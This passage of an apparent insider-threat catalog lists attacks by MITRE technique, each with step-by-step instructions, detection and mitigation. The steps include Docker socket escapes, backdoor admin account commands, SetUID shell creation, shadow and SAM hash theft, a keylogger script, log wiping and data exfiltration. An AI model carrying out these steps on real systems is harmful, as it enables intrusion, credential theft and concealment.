- **Scenario**: Dev with container access uses mounted Docker socket to break into host machine.
- **Attack Steps**: Step 1: Insider notices /var/run/docker.sock is mounted inside container. Step 2: Runs docker run -v /:/host -it alpine chroot /host. Step 3: Gains root access to host filesystem. Step 4: Modifies /etc/shadow or copies host SSH keys. Step 5: Logs in as root on host.
- **Detection**: Monitor Docker volumes, block socket
- **Solution**: Avoid mounting docker.sock
- **Tags**: Docker, Escape, Root

## Python Script with os.system() Abuse

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: Unvalidated script input
- **MITRE**: T1059.006
- **Impact**: Unauthorized access via scheduled script
- **Tools**: Python
- **Scenario**: Intern modifies a maintenance Python script that uses os.system() to include unauthorized commands.
- **Attack Steps**: Step 1: Finds maintenance.py script in shared drive. Step 2: Opens it and sees lines like os.system("mkdir backup"). Step 3: Appends os.system("net user hacker Pass123 /add"). Step 4: Waits for automated script to run. Step 5: Admin account created silently.
- **Detection**: Code audit, file hash checks
- **Solution**: Validate code, use subprocess safely
- **Tags**: Python, os.system, Script Injection

## Custom Installer with Task Scheduler Auto-Run

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: Unrestricted Task Scheduler access
- **MITRE**: T1053.005
- **Impact**: Full control over system
- **Tools**: NSIS, Task Scheduler
- **Scenario**: Insider creates a custom app that schedules itself as a SYSTEM task upon install.
- **Attack Steps**: Step 1: Insider creates EXE installer with NSIS. Step 2: Adds script to create scheduled task running cmd.exe as SYSTEM on login. Step 3: Installs app on shared kiosk. Step 4: On next boot, SYSTEM command shell opens automatically. Step 5: Uses shell to access everything.
- **Detection**: Audit new scheduled tasks
- **Solution**: Restrict task creation permissions
- **Tags**: Task Scheduler, NSIS, SYSTEM

## Modifying PATH Variable to Hijack Executable

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: PATH precedence manipulation
- **MITRE**: T1574.009
- **Impact**: Fake tools executed as system commands
- **Tools**: Notepad, Command Prompt
- **Scenario**: Insider manipulates the system PATH environment variable to run a fake command with admin privileges.
- **Attack Steps**: Step 1: Insider opens Environment Variables settings. Step 2: Moves C:\Users\Public\Tools to the top of the PATH. Step 3: Places a fake net.exe file in Tools folder that creates an admin user. Step 4: Opens Run > types net – system runs the fake one first. Step 5: New admin user is created silently. Step 6: Logs in using backdoor account.
- **Detection**: Audit PATH changes, new user creation
- **Solution**: Lock PATH variable and restrict write access
- **Tags**: PATH Hijack, Windows, Fake Executable

## PostgreSQL Function Privilege Abuse

- **Attack Type**: Privilege Escalation
- **Target**: Linux / Windows DB Server
- **Vulnerability**: Unsafe function privilege in DB
- **MITRE**: T1505.003
- **Impact**: DB-to-OS code execution
- **Tools**: PostgreSQL CLI
- **Scenario**: Developer exploits a PostgreSQL database with CREATE FUNCTION privilege to execute OS commands.
- **Attack Steps**: Step 1: Connects to PostgreSQL database. Step 2: Runs SQL to create a function using plpythonu or plperlu. Step 3: Defines a command like os.system("net user admin2 /add"). Step 4: Executes the function inside the DB. Step 5: OS command runs with DB user privileges. Step 6: Gains access using new user.
- **Detection**: Audit DB function creation
- **Solution**: Limit function permission per user
- **Tags**: PostgreSQL, DB Escalation

## Exploiting Linux Polkit Privilege Escalation

- **Attack Type**: Privilege Escalation
- **Target**: Linux
- **Vulnerability**: CVE-2021-4034 (Polkit pkexec)
- **MITRE**: T1068
- **Impact**: Full root control
- **Tools**: Terminal
- **Scenario**: Insider runs a public PoC for CVE-2021-4034 (pkexec) to escalate to root.
- **Attack Steps**: Step 1: Downloads exploit script from GitHub. Step 2: Compiles it using gcc exploit.c -o rootme. Step 3: Runs ./rootme. Step 4: Shell opens with root privileges. Step 5: Copies /etc/shadow or installs persistent access.
- **Detection**: Monitor pkexec use, patch system
- **Solution**: Update polkit package
- **Tags**: CVE, Linux, Polkit

## Abuse of Outlook Add-in Script

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: Macro execution in email client
- **MITRE**: T1059.005
- **Impact**: Auto-triggered command shell
- **Tools**: Outlook, VBA Editor
- **Scenario**: Insider injects malicious VBA macro into Outlook Add-in to run on each mail event with elevated privileges.
- **Attack Steps**: Step 1: Opens Outlook > Developer tab > Visual Basic Editor. Step 2: Edits ThisOutlookSession and adds macro that runs Shell("cmd.exe"). Step 3: Enables macros if disabled. Step 4: Macro triggers on new email event. Step 5: Command prompt opens with current user privileges (if admin – privilege gained).
- **Detection**: Monitor macro execution logs
- **Solution**: Disable or sign macros in Outlook
- **Tags**: VBA, Email, Outlook Hack

## Sudoers Misuse via Wildcards

- **Attack Type**: Privilege Escalation
- **Target**: Linux
- **Vulnerability**: Overly broad wildcard sudo config
- **MITRE**: T1548.003
- **Impact**: Root account takeover
- **Tools**: Linux Terminal
- **Scenario**: Insider is allowed to run specific commands using sudo but uses wildcards to escalate privileges.
- **Attack Steps**: Step 1: Runs sudo -l and sees allowed sudo cp * /tmp/ with no password. Step 2: Uses it to copy /etc/shadow to /tmp. Step 3: Opens /tmp/shadow and cracks root hash offline. Step 4: Replaces root password and logs in as root.
- **Detection**: Log analysis on sudo usage
- **Solution**: Avoid wildcards in sudoers
- **Tags**: Wildcard Sudo, Linux

## Abusing Debug Programs User Right

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: Misconfigured user rights
- **MITRE**: T1548.001
- **Impact**: SYSTEM access through debugger
- **Tools**: WinDbg
- **Scenario**: Intern is assigned Debug Programs right and attaches debugger to SYSTEM process to execute payload.
- **Attack Steps**: Step 1: Opens WinDbg with admin privileges. Step 2: Attaches to winlogon.exe or another SYSTEM process. Step 3: Injects code or modifies memory to run reverse shell. Step 4: Gets SYSTEM shell.
- **Detection**: Monitor debugger and memory changes
- **Solution**: Remove debug rights from standard users
- **Tags**: Debug Privileges, SYSTEM

## SAM File Access from Shadow Copy

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: Accessible shadow copy
- **MITRE**: T1003.002
- **Impact**: Admin password recovered
- **Tools**: PowerShell, mimikatz
- **Scenario**: Insider uses shadow copies to access the Windows SAM file and extract admin password hashes.
- **Attack Steps**: Step 1: Runs vssadmin list shadows to check for shadow copies. Step 2: Accesses \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM. Step 3: Copies SAM and SYSTEM files. Step 4: Uses mimikatz to extract hashes. Step 5: Cracks them offline and logs in as admin.
- **Detection**: VSS usage monitoring
- **Solution**: Restrict shadow copy access
- **Tags**: SAM, VSS, Mimikatz

## Abusing Jenkins Script Console

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: Console access without restriction
- **MITRE**: T1059.005
- **Impact**: Admin account creation via CI
- **Tools**: Jenkins, Groovy Script
- **Scenario**: Developer with access to Jenkins Script Console runs Groovy script to create admin account on host machine.
- **Attack Steps**: Step 1: Opens Jenkins > Manage Jenkins > Script Console. Step 2: Pastes script: def cmd = "net user backdoor Pass123 /add".execute() Step 3: Script runs with Jenkins privileges. Step 4: New user is created. Step 5: Logs in via RDP using new user.
- **Detection**: Audit Jenkins console usage
- **Solution**: Disable script console or restrict access
- **Tags**: Jenkins, CI Exploit

## SetUID Shell Binary Created via Cron Job

- **Attack Type**: Privilege Escalation
- **Target**: Linux
- **Vulnerability**: Writable cron script
- **MITRE**: T1053.003
- **Impact**: Root shell via SetUID
- **Tools**: Linux, Bash
- **Scenario**: Insider modifies a script triggered by cron to copy /bin/bash and make it SetUID root.
- **Attack Steps**: Step 1: Finds /etc/cron.daily/cleanlogs script is editable. Step 2: Adds command cp /bin/bash /tmp/shell && chmod +s /tmp/shell. Step 3: Waits for cron to run the script. Step 4: Executes /tmp/shell -p to get root shell.
- **Detection**: Monitor cron script changes
- **Solution**: Use immutability and permissions
- **Tags**: Cron, SetUID, Root Hack

## Exploiting System Restore Folder Permissions

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: Weak folder ACLs
- **MITRE**: T1003.002
- **Impact**: User impersonation
- **Tools**: NTFS tools
- **Scenario**: Insider uses open permissions on System Volume Information to recover and modify registry files.
- **Attack Steps**: Step 1: Gains read access to System Volume Information. Step 2: Copies old SAM and SYSTEM registry hives from restore point. Step 3: Mounts them and reads user hashes. Step 4: Cracks and replaces credentials.
- **Detection**: Monitor file access in restore folders
- **Solution**: Harden NTFS permissions
- **Tags**: System Restore, ACL Abuse

## Abusing NFS Root Squash Misconfig

- **Attack Type**: Privilege Escalation
- **Target**: Linux Server
- **Vulnerability**: Misconfigured NFS export
- **MITRE**: T1200
- **Impact**: Remote root via file share
- **Tools**: Linux Terminal
- **Scenario**: Insider uploads files to a Network File Share (NFS) server mounted without root_squash, gaining root access remotely.
- **Attack Steps**: Step 1: Finds NFS share mounted at /mnt/shared. Step 2: Confirms it’s mounted with no_root_squash by checking /etc/exports. Step 3: Creates a file as root user on local machine. Step 4: Copies it to the shared folder. Step 5: On the server, file retains root ownership. Step 6: Executes file and gains root access.
- **Detection**: NFS logs, file ownership alerts
- **Solution**: Always use root_squash in exports
- **Tags**: NFS, File Share Abuse

## Remote Desktop Clipboard Hijack

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: Shared clipboard in RDP
- **MITRE**: T1110.004
- **Impact**: Admin credential reuse
- **Tools**: RDP
- **Scenario**: Staff member uses RDP clipboard feature to steal credentials copied during a remote admin session.
- **Attack Steps**: Step 1: Insider RDPs into a shared server right after admin logs out. Step 2: Opens clipboard history (Win + V) and finds password. Step 3: Uses credentials to login as admin on other systems.
- **Detection**: Monitor clipboard use, session logs
- **Solution**: Disable clipboard in RDP policy
- **Tags**: RDP, Clipboard Leak

## Exploiting Weak sudo Logging Policy

- **Attack Type**: Privilege Escalation
- **Target**: Linux
- **Vulnerability**: Disabled sudo logging
- **MITRE**: T1548.003
- **Impact**: Root persistence without trace
- **Tools**: Bash
- **Scenario**: Insider runs sudo to perform malicious actions, taking advantage of disabled logging and auditing.
- **Attack Steps**: Step 1: Insider is allowed to use sudo but logs aren’t captured. Step 2: Executes sudo su to gain root. Step 3: Creates backdoor root user using useradd. Step 4: Deletes bash history and leaves no traces.
- **Detection**: Set up auditd to log sudo activity
- **Solution**: Enforce secure logging and history capture
- **Tags**: Linux, sudo Abuse

## Scripting Host Execution from Word Doc

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: WSH access via Office macros
- **MITRE**: T1059.005
- **Impact**: Shell with elevated rights
- **Tools**: Word, WScript
- **Scenario**: Employee embeds a Windows Script Host payload into a Word document and executes it to escalate.
- **Attack Steps**: Step 1: Opens Word, inserts macro that calls WScript.Shell. Step 2: Macro runs cmd.exe silently with runas targeting admin tools. Step 3: Insider triggers macro and enters cached admin password. Step 4: Gains elevated session.
- **Detection**: Macro behavior monitoring
- **Solution**: Block WScript from Office
- **Tags**: WSH, Macro, Word

## Misconfigured Setcap Capabilities

- **Attack Type**: Privilege Escalation
- **Target**: Linux
- **Vulnerability**: Insecure capabilities
- **MITRE**: T1548.001
- **Impact**: Root access via setcap
- **Tools**: Terminal
- **Scenario**: User finds a binary with Linux capabilities that allows arbitrary command execution.
- **Attack Steps**: Step 1: Runs getcap -r / 2>/dev/null to list binaries with capabilities. Step 2: Finds /usr/local/bin/helper with cap_setuid+ep. Step 3: Executes binary, which allows switching to root. Step 4: Gains shell as root.
- **Detection**: Monitor binaries with caps
- **Solution**: Limit or remove unnecessary capabilities
- **Tags**: Linux, setcap, Root Hack

## Windows Registry Autorun Exploit

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: Autorun key abuse
- **MITRE**: T1547.001
- **Impact**: Script runs with highest privilege
- **Tools**: Registry Editor
- **Scenario**: Insider adds a script path to Registry’s Run key to execute on next reboot as SYSTEM.
- **Attack Steps**: Step 1: Opens regedit as user with limited admin rights. Step 2: Navigates to HKLM\Software\Microsoft\Windows\CurrentVersion\Run. Step 3: Adds new string backdoor = C:\backdoor.exe. Step 4: Reboots machine. Step 5: Script runs with SYSTEM privileges.
- **Detection**: Monitor registry changes
- **Solution**: Lock registry keys with ACLs
- **Tags**: Registry, Autorun, SYSTEM

## TeamViewer Misuse for Remote Elevation

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: Unattended access enabled
- **MITRE**: T1078.003
- **Impact**: Full remote takeover
- **Tools**: TeamViewer
- **Scenario**: Insider uses unattended TeamViewer session left active on admin’s system.
- **Attack Steps**: Step 1: Opens TeamViewer on shared system. Step 2: Notices unattended session for "Admin-PC". Step 3: Connects without password. Step 4: Gets full control of remote admin session. Step 5: Uses it to extract files and install software.
- **Detection**: TeamViewer logs, session alerts
- **Solution**: Require 2FA and session timeout
- **Tags**: Remote Access, Insider Abuse

## Abusing Insecure Dockerfile ENTRYPOINT

- **Attack Type**: Privilege Escalation
- **Target**: Linux Docker Host
- **Vulnerability**: Insecure container privilege
- **MITRE**: T1611
- **Impact**: Host compromise via Docker
- **Tools**: Docker, Bash
- **Scenario**: Dev abuses Dockerfile misconfigured to run container as root with access to host via volume mount.
- **Attack Steps**: Step 1: Reads Dockerfile and sees USER root. Step 2: Builds and runs container with -v /:/mnt. Step 3: Inside container, accesses /mnt/etc/shadow. Step 4: Copies or modifies system files.
- **Detection**: Monitor container configs
- **Solution**: Never run as root inside Docker
- **Tags**: Docker, Volume, Root

## Modifying Local GPO Scripts

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: GPO script abuse
- **MITRE**: T1059.003
- **Impact**: Remote access via GPO
- **Tools**: gpedit.msc, Script Editor
- **Scenario**: Insider changes logon script in Group Policy to launch reverse shell.
- **Attack Steps**: Step 1: Runs gpedit.msc. Step 2: Navigates to User Config > Windows Settings > Scripts (Logon). Step 3: Adds script rev_shell.bat that opens a remote session. Step 4: Waits for user logon. Step 5: Script triggers and attacker gets control.
- **Detection**: Monitor policy changes
- **Solution**: Restrict GPO editing rights
- **Tags**: GPO, Reverse Shell

## Android Debug Bridge (ADB) Shell Escalation

- **Attack Type**: Privilege Escalation
- **Target**: Android
- **Vulnerability**: ADB enabled + rooted device
- **MITRE**: T1412
- **Impact**: Mobile device compromise
- **Tools**: ADB, Android SDK
- **Scenario**: Mobile tester connects to unattended Android device with ADB enabled and gains root shell.
- **Attack Steps**: Step 1: Connects Android device via USB. Step 2: Runs adb devices to confirm connection. Step 3: Runs adb shell then su to enter root shell (if rooted or test device). Step 4: Copies sensitive files or installs spyware.
- **Detection**: USB and ADB connection logs
- **Solution**: Disable ADB or use PIN-protected shell
- **Tags**: ADB, Android, Mobile Hack

## USB Drive with AutoRun Script

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Endpoint System
- **Vulnerability**: No USB restrictions; PowerShell not blocked
- **MITRE**: T1059.001 (Command-Line Interface)
- **Impact**: Data exfiltration without detection
- **Tools**: Windows PowerShell, Notepad
- **Scenario**: An insider uses a USB drive with a malicious but legitimate script to execute a payload when plugged into an office system.
- **Attack Steps**: Step 1: Insider creates a text file with a .ps1 extension (e.g., malicious.ps1) that silently copies files or opens a backdoor. Step 2: Using Notepad, they write a PowerShell script like Copy-Item -Path C:\Sensitive\* -Destination D:\StolenData. Step 3: They save it to a USB drive. Step 4: On the office PC, they plug in the USB. Step 5: Double-clicking a decoy file triggers the PowerShell script. Step 6: Files are copied to the USB drive without any popup. Step 7: Insider unplugs USB and leaves.
- **Detection**: Monitor USB insert events; block unknown USB drives
- **Solution**: Disable USB ports; monitor script execution
- **Tags**: USB, PowerShell, Exfiltration

## Abusing Scheduled Tasks

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Internal Workstation
- **Vulnerability**: Scheduled Tasks unchecked
- **MITRE**: T1053.005 (Scheduled Task)
- **Impact**: Long-term access, silent data exfiltration
- **Tools**: Task Scheduler, PowerShell
- **Scenario**: Employee creates a scheduled task that runs a malicious file daily to maintain access or data theft.
- **Attack Steps**: Step 1: Insider searches "Task Scheduler" from the Windows Start menu. Step 2: They create a new task that runs daily at lunch break. Step 3: They attach a script (logstealer.ps1) that copies new files from a folder to a remote shared drive. Step 4: This script is placed in a hidden folder (e.g., C:\Temp\hidden\). Step 5: Task is saved with a harmless name like “Windows Update Check”. Step 6: Every day, the script runs quietly while the insider is away. Step 7: After a week, they collect stolen data from the shared folder.
- **Detection**: Log all scheduled tasks, alert on new creations
- **Solution**: Regular audit of task scheduler
- **Tags**: Task Scheduler, Stealth, Automation

## Using Microsoft Excel Macros

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Office PCs
- **Vulnerability**: Macros enabled by default
- **MITRE**: T1064 (Scripting)
- **Impact**: Credential harvesting
- **Tools**: Microsoft Excel, VBA Editor
- **Scenario**: Insider embeds malicious macros in an Excel file to collect and send login data.
- **Attack Steps**: Step 1: Insider opens Excel and presses Alt + F11 to open the VBA editor. Step 2: They write a macro that captures login entries and emails them using Application.SendKeys or Shell. Step 3: Macro is saved in "ThisWorkbook" to trigger on open. Step 4: Insider saves the file as "Monthly_Sales_Report.xlsm". Step 5: They email it to a colleague, asking for review. Step 6: When the file is opened, the macro executes silently. Step 7: Login credentials are sent to a private email.
- **Detection**: Monitor macro activity and email logs
- **Solution**: Disable macros unless signed, use email scanning
- **Tags**: Excel, VBA, Credential Theft

## Remote Desktop Protocol Abuse

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Server
- **Vulnerability**: Weak access control policies
- **MITRE**: T1021.001 (Remote Desktop Protocol)
- **Impact**: Unauthorized access and data manipulation
- **Tools**: Windows RDP, Event Viewer
- **Scenario**: Insider uses RDP to access systems after hours and manipulate logs or data.
- **Attack Steps**: Step 1: Insider notes down system names/IPs using their legitimate access. Step 2: After hours, they launch Remote Desktop from their personal office PC. Step 3: They enter their valid credentials and access the critical system. Step 4: They download confidential documents or delete logs. Step 5: They use Event Viewer to clear traces of logins or file activity. Step 6: Logout and disconnect quietly.
- **Detection**: Log RDP access with time/user/device data
- **Solution**: Enforce time-based access, MFA for RDP
- **Tags**: RDP, Lateral Movement, Log Tampering

## Using File Transfer Tools Internally

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: File Server / User PC
- **Vulnerability**: No DLP, no FTP monitoring
- **MITRE**: T1048 (Exfiltration Over Alternative Protocol)
- **Impact**: Large-scale data theft over days
- **Tools**: WinSCP, FileZilla
- **Scenario**: Insider uses legitimate FTP or SCP tools to transfer data to external servers from inside.
- **Attack Steps**: Step 1: Insider downloads and installs WinSCP on their office system. Step 2: They configure it to connect to their home or rented FTP server (hosted on DuckDNS or a VPS). Step 3: They compress documents into .zip files to avoid DLP detection. Step 4: Every evening, they drag & drop folders into WinSCP. Step 5: Files are silently uploaded to the external FTP server. Step 6: Insider deletes local transfer history/logs. Step 7: They access files from home later.
- **Detection**: Monitor outbound FTP/SCP traffic, alert on unknown servers
- **Solution**: Block FTP/SCP apps, restrict internet access
- **Tags**: FTP, FileZilla, Data Leak

## Exploiting Outlook Rules for Data Exfiltration

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Email Server
- **Vulnerability**: Weak DLP and rule monitoring
- **MITRE**: T1114 (Email Collection)
- **Impact**: Unauthorized sensitive data access
- **Tools**: Microsoft Outlook
- **Scenario**: Insider configures Outlook rules to automatically forward sensitive emails to their personal address.
- **Attack Steps**: Step 1: Insider opens Outlook and navigates to "Rules & Alerts". Step 2: They create a new rule: “When email has attachment or subject contains 'Report'” → Forward to personal email. Step 3: Save rule with a generic name like “AutoSort”. Step 4: All matching future emails are silently forwarded. Step 5: Insider deletes the rule after data exfiltration.
- **Detection**: Monitor forwarding rules, block external domains
- **Solution**: Restrict rule creation, implement email DLP
- **Tags**: Outlook, Email, AutoForward

## Leveraging Google Chrome Password Manager

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Endpoint Browser
- **Vulnerability**: No credential storage control
- **MITRE**: T1555 (Credentials from Password Stores)
- **Impact**: Credential theft & privilege abuse
- **Tools**: Google Chrome
- **Scenario**: Insider uses Chrome to export saved passwords to access internal systems or colleague accounts.
- **Attack Steps**: Step 1: Insider opens Chrome > Settings > Autofill > Password Manager. Step 2: Clicks "Export Passwords", confirms system password. Step 3: Saves exported .csv file (contains usernames & passwords). Step 4: Opens .csv in Excel/Notepad. Step 5: Uses credentials to access internal tools or email.
- **Detection**: Alert on export of password files
- **Solution**: Disable browser password storage
- **Tags**: Chrome, Credential Theft

## Internal Browser Developer Tools for Token Theft

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Web Application
- **Vulnerability**: Auth tokens exposed in storage
- **MITRE**: T1557 (Man-in-the-Middle)
- **Impact**: Session hijacking
- **Tools**: Chrome DevTools, Firefox Inspector
- **Scenario**: Insider uses browser DevTools to extract auth tokens or cookies from web apps.
- **Attack Steps**: Step 1: Open browser, right-click on logged-in page > Inspect. Step 2: Go to "Application" tab → "Cookies" or "Local Storage". Step 3: Copy auth token, session ID, or JWT. Step 4: Use it in Incognito tab or Postman to impersonate session. Step 5: Access restricted areas without credentials.
- **Detection**: Monitor token reuse/IP anomalies
- **Solution**: Use short-lived tokens; restrict reuse
- **Tags**: WebApp, Browser, Token Abuse

## Using Excel Power Query for External Data Links

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Office PCs
- **Vulnerability**: No restrictions on Power Query
- **MITRE**: T1119 (Automated Collection)
- **Impact**: Silent data leak via Excel
- **Tools**: Microsoft Excel Power Query
- **Scenario**: Insider embeds a data connection in Excel to pull/push data from external sources.
- **Attack Steps**: Step 1: Open Excel → Data → Get Data → From Web. Step 2: Enter external server link they control (e.g., Google Drive CSV). Step 3: Setup query to fetch and overwrite data with internal values. Step 4: Save Excel file and close. Step 5: On open, Excel fetches data or uploads it externally. Step 6: Insider accesses the linked file externally.
- **Detection**: Monitor external data connections in Excel
- **Solution**: Block external links in macros
- **Tags**: Excel, PowerQuery, Data Link

## Using Built-In Remote Assistance

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Desktop System
- **Vulnerability**: No restriction on remote assist
- **MITRE**: T1021.001 (Remote Services)
- **Impact**: External data transfer
- **Tools**: Windows Quick Assist, Remote Assistance
- **Scenario**: Insider enables "Quick Assist" or "Remote Assistance" to share screen and transfer files with an external device.
- **Attack Steps**: Step 1: Insider opens Start > "Quick Assist". Step 2: They generate a session code and send it to personal email/device. Step 3: On personal device, they join the session. Step 4: Insider accepts and shares control. Step 5: Use the session to download internal files externally. Step 6: Disconnect and erase any session traces.
- **Detection**: Log remote access tools; alert on public access
- **Solution**: Disable Quick Assist or limit it via GPO
- **Tags**: Remote, Windows, Data Theft

## Exploiting Windows Event Viewer for Log Deletion

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Server / Workstation
- **Vulnerability**: Lack of log immutability
- **MITRE**: T1070.001 (Clear Windows Event Logs)
- **Impact**: Log deletion, cover-up actions
- **Tools**: Windows Event Viewer
- **Scenario**: Insider uses built-in Event Viewer to delete evidence of activities like logins or errors.
- **Attack Steps**: Step 1: Click Start → Search for "Event Viewer". Step 2: Navigate to “Windows Logs” → “Security”. Step 3: Right-click → “Clear Log…” → Save or Discard. Step 4: Repeat for “System” and “Application” logs. Step 5: Insider does malicious action (e.g., unauthorized data access). Step 6: No trace is left in event logs.
- **Detection**: Alert on log deletion events
- **Solution**: Use WORM storage, SIEM log forwarding
- **Tags**: Log Tampering, Event Viewer

## Creating Hidden Files Using Command Prompt

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Desktop System
- **Vulnerability**: Weak visibility into file system
- **MITRE**: T1564.001 (Hidden Files and Directories)
- **Impact**: File evasion & hidden exfiltration
- **Tools**: Windows CMD
- **Scenario**: Insider uses legitimate commands to hide sensitive stolen files in plain sight.
- **Attack Steps**: Step 1: Open Command Prompt with user privileges. Step 2: Type attrib +h +s +r stolen_data.docx Step 3: File becomes hidden from normal view. Step 4: Insider copies to USB/cloud folder unnoticed. Step 5: File is unhidden later using reverse command.
- **Detection**: Enable hidden file monitoring
- **Solution**: Monitor file attribute changes
- **Tags**: Hidden Files, CMD

## Screenshots via Snipping Tool

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Workstation
- **Vulnerability**: DLP tools don’t cover screenshots
- **MITRE**: T1113 (Screen Capture)
- **Impact**: Visual data theft
- **Tools**: Snipping Tool, Windows
- **Scenario**: Insider takes screenshots of sensitive documents instead of downloading files.
- **Attack Steps**: Step 1: Insider opens “Snipping Tool” or “Snip & Sketch”. Step 2: Uses it to select areas like emails, dashboards, or PDFs. Step 3: Saves them as image files (e.g., report1.png). Step 4: Zips images and sends them via email or USB. Step 5: Deletes the image history after sending.
- **Detection**: Monitor screenshot apps and clipboard
- **Solution**: Use watermarking, disable tools via GPO
- **Tags**: Snipping Tool, Screenshot, Image Theft

## AutoHotKey Script for Keylogging

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: User PC
- **Vulnerability**: No anti-keylogging tools
- **MITRE**: T1056.001 (Keylogging)
- **Impact**: Password and confidential data theft
- **Tools**: AutoHotKey
- **Scenario**: Insider uses a legitimate automation tool to log keystrokes from a colleague.
- **Attack Steps**: Step 1: Insider installs AutoHotKey on office PC. Step 2: Writes a script like: ~a::FileAppend, a, log.txt Step 3: Script logs every keystroke into a hidden file. Step 4: Runs script at startup using Task Scheduler. Step 5: Collects .txt file after few days. Step 6: Deletes script and logs post-use.
- **Detection**: Detect AHK and script triggers
- **Solution**: Block script-based apps on user PCs
- **Tags**: Keylogger, AutoHotKey

## OneDrive Sync Abuse

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Cloud Storage
- **Vulnerability**: No OneDrive monitoring policy
- **MITRE**: T1537 (Transfer Data to Cloud Account)
- **Impact**: Cloud-based exfiltration
- **Tools**: OneDrive
- **Scenario**: Insider syncs internal folders with personal OneDrive to access files remotely.
- **Attack Steps**: Step 1: Insider signs into OneDrive with personal ID. Step 2: Sets sync folder as C:\CompanyFiles. Step 3: OneDrive silently uploads files to personal cloud. Step 4: Insider accesses those files from mobile or home. Step 5: Deletes sync history before leaving.
- **Detection**: Block personal cloud logins on office PCs
- **Solution**: Use cloud DLP tools
- **Tags**: OneDrive, Sync, Cloud Theft

## Misuse of Credential Manager

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: User PC
- **Vulnerability**: Saved credentials visible
- **MITRE**: T1555.004 (Windows Credential Manager)
- **Impact**: Unauthorized account access
- **Tools**: Windows Credential Manager
- **Scenario**: Insider uses Windows Credential Manager to extract saved credentials for internal apps or shared drives.
- **Attack Steps**: Step 1: Insider opens "Credential Manager" via Control Panel. Step 2: Goes to "Windows Credentials". Step 3: Expands saved credentials (e.g., shared drives or web apps). Step 4: Copies usernames and manually tries guessed passwords or uses tools like cmdkey. Step 5: Uses credentials for unauthorized access.
- **Detection**: Monitor changes to stored credentials
- **Solution**: Block saving of credentials for internal resources
- **Tags**: Credential Manager, Shared Drives

## Clipboard Hijack with Notepad++ Plugin

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Workstation
- **Vulnerability**: Unmonitored clipboard access
- **MITRE**: T1115 (Clipboard Data)
- **Impact**: Theft of copied credentials/data
- **Tools**: Notepad++, ClipboardHistory Plugin
- **Scenario**: Insider uses clipboard monitoring plugin in Notepad++ to steal passwords, tokens, or secrets.
- **Attack Steps**: Step 1: Install Notepad++ and add ClipboardHistory plugin. Step 2: Plugin silently captures every copy (Ctrl+C) action. Step 3: User copies credentials, tokens, or URLs. Step 4: Insider opens Clipboard History tab and saves it to a .txt file. Step 5: Exfiltrates this file via email or USB.
- **Detection**: Monitor clipboard use and plugin activity
- **Solution**: Disable clipboard monitoring tools
- **Tags**: Clipboard, Plugins, Notepad++

## Misusing Remote PowerShell Access

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Server
- **Vulnerability**: Remote PowerShell not restricted
- **MITRE**: T1059.001 (PowerShell)
- **Impact**: Unauthorized server access
- **Tools**: PowerShell, Enter-PSSession
- **Scenario**: Insider uses legitimate remote PowerShell session to access server data from a personal PC on VPN.
- **Attack Steps**: Step 1: Insider connects to VPN and opens PowerShell on their device. Step 2: Runs Enter-PSSession -ComputerName internalserver -Credential user@domain. Step 3: Accesses file shares or runs data-export scripts. Step 4: Transfers data to their system. Step 5: Ends session and clears history.
- **Detection**: Monitor remote session commands
- **Solution**: Restrict PowerShell remoting, enforce Just Enough Admin
- **Tags**: Remote PowerShell, VPN

## Misuse of Windows Sysinternals

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Internal Network
- **Vulnerability**: No restriction on admin tools
- **MITRE**: T1543.003 (Windows Service Execution)
- **Impact**: Remote execution, surveillance
- **Tools**: Sysinternals Suite
- **Scenario**: Insider uses legit Sysinternals tools like PsExec, ProcMon, and TCPView for lateral movement or process spying.
- **Attack Steps**: Step 1: Insider downloads Sysinternals Suite from Microsoft site. Step 2: Uses TCPView to monitor internal IPs and open ports. Step 3: Uses PsExec to remotely launch apps/scripts on other machines. Step 4: Uses ProcMon to capture app behaviors or sensitive file access. Step 5: Saves logs and exfiltrates them.
- **Detection**: Monitor usage of Sysinternals tools
- **Solution**: Limit access, alert on PsExec and ProcMon activity
- **Tags**: Sysinternals, PsExec, Process Monitor

## Abusing Windows Search Index

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Network Shares
- **Vulnerability**: No access restriction on files
- **MITRE**: T1213 (Data from Information Repositories)
- **Impact**: Broad data discovery & collection
- **Tools**: Windows Search, File Explorer
- **Scenario**: Insider uses Windows Search to quickly locate sensitive files across the network.
- **Attack Steps**: Step 1: Opens File Explorer. Step 2: Enters queries like *.docx, "confidential", or "password" in search bar. Step 3: Navigates to network drives and repeats search. Step 4: Opens files and saves locally. Step 5: Hides file copy in zipped folder.
- **Detection**: Monitor file access by user
